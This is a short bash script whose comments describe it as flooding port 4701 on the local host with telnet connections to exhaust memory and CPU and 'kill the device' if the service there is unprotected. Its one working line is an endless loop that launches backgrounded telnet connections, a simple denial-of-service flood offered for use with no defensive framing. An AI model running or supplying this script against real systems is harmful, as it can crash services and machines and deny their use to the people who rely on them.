#!/bin/bash
#
# Floods the port 4701 of the local host with telnet connections.
#
# Basicly kills the device if it's not protected & affects mostly the memory
# & CPU ressource & might affect the hard drive depending the service running.
# (Only works if theres something on that port and if its 'basic')
while true; do telnet ::1 4701& done
clear;
